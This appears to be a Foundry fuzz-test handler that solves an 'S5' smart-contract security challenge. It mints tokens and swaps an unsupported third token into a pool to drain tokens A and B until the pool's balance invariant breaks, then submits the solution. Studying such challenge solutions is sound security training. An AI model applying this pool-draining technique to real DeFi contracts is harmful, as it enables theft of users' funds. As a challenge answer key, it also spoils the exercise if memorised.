// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {S5} from "../../src/challenges/S5.sol";
import {S5Pool} from "../../src/challenges/S5Pool.sol";
import {S5Token} from "../../src/challenges/S5Token.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract S5Handler is Test {
    error S5Handler__ZeroAddress();
    error S5Handler__ZeroActors();

    S5 challenge;
    S5Pool pool;
    S5Token tokenA;
    S5Token tokenB;
    S5Token tokenC;

    uint256 constant TOKEN_MINT_PRECISION = 1e18;

    // ghost variables
    uint256 public initialTotalTokens; // same as S% constructor 'i_initialTotalTokens'
    uint64 public mintsCounter;
    uint64 public depositsCounter;
    uint64 public swapsCounter;
    bool public challengeSolved; // only true when challenge has been solved
    address public challengeResolver; // user who solve the challenge

    address[] public actors;

    address internal currentActor;

    modifier useActor(uint256 actorIndexSeed) {
        currentActor = actors[bound(actorIndexSeed, 0, actors.length - 1)];
        vm.startPrank(currentActor);
        _;
        vm.stopPrank();
    }

    constructor(address _challenge, address[] memory _actors) {
        if (_actors.length == 0) {
            revert S5Handler__ZeroActors();
        }
        challenge = S5(_challenge);
        address _getPool = challenge.getPool();
        address _getTokenA = challenge.getTokenA();
        address _getTokenB = challenge.getTokenB();
        address _getTokenC = challenge.getTokenC();

        if (_getPool == address(0)) {
            revert S5Handler__ZeroAddress();
        }
        if (_getTokenA == address(0)) {
            revert S5Handler__ZeroAddress();
        }
        if (_getTokenB == address(0)) {
            revert S5Handler__ZeroAddress();
        }
        if (_getTokenC == address(0)) {
            revert S5Handler__ZeroAddress();
        }

        pool = S5Pool(_getPool);
        tokenA = S5Token(_getTokenA);
        tokenB = S5Token(_getTokenB);
        tokenC = S5Token(_getTokenC);
        actors = _actors;
        initialTotalTokens = tokenA.INITIAL_SUPPLY() + tokenB.INITIAL_SUPPLY();
    }

    function solveChallenge(
        uint256 actorIndexSeed
    ) public useActor(actorIndexSeed) {
        if (challengeSolved) {
            return;
        }
        // pool have enough balance
        uint256 _poolBalanceOfTokenA = IERC20(tokenA).balanceOf(address(pool));
        uint256 _poolBalanceOfTokenB = IERC20(tokenB).balanceOf(address(pool));
        // drain token A from pool
        if (_poolBalanceOfTokenA > TOKEN_MINT_PRECISION) {
            _mintTokensAndApprovals();
            pool.swapFrom(IERC20(tokenC), IERC20(tokenA), TOKEN_MINT_PRECISION);
            swapsCounter++;
        }
        // drain token B from pool
        if (_poolBalanceOfTokenB > TOKEN_MINT_PRECISION) {
            _mintTokensAndApprovals();
            pool.swapFrom(IERC20(tokenC), IERC20(tokenB), TOKEN_MINT_PRECISION);
            swapsCounter++;
        }
        // check if invariant has been break in order to solve the challenge
        bool isSolved = _invariantSolved();
        if (isSolved) {
            _deposit();
            challenge.solveChallenge("thecil_eth");
            challengeResolver = currentActor;
            challengeSolved = true;
        }
    }

    /*//////////////////////////////////////////////////////////////
                                HELPERS
    //////////////////////////////////////////////////////////////*/
    function _invariantSolved() private view returns (bool) {
        uint256 amountA = IERC20(tokenA).balanceOf(address(challenge));
        uint256 amountB = IERC20(tokenB).balanceOf(address(challenge));
        return !(amountA + amountB >= initialTotalTokens);
    }

    function _mintTokensAndApprovals() private {
        // mint tokens
        tokenA.mint(currentActor);
        tokenB.mint(currentActor);
        tokenC.mint(currentActor);
        // allow pool to transfer tokens
        IERC20(address(tokenA)).approve(address(pool), type(uint256).max);
        IERC20(address(tokenB)).approve(address(pool), type(uint256).max);
        IERC20(address(tokenC)).approve(address(pool), type(uint256).max);
        mintsCounter++;
    }

    function _deposit() private {
        _mintTokensAndApprovals();
        // deposit tokens to pool
        uint64 deadline = uint64(block.timestamp + 20 seconds);
        pool.deposit(TOKEN_MINT_PRECISION, deadline);
        depositsCounter++;
    }

    // function _lpBalanceOf(address _user) private view returns (uint256) {
    //     return IERC20(address(pool)).balanceOf(_user);
    // }
}
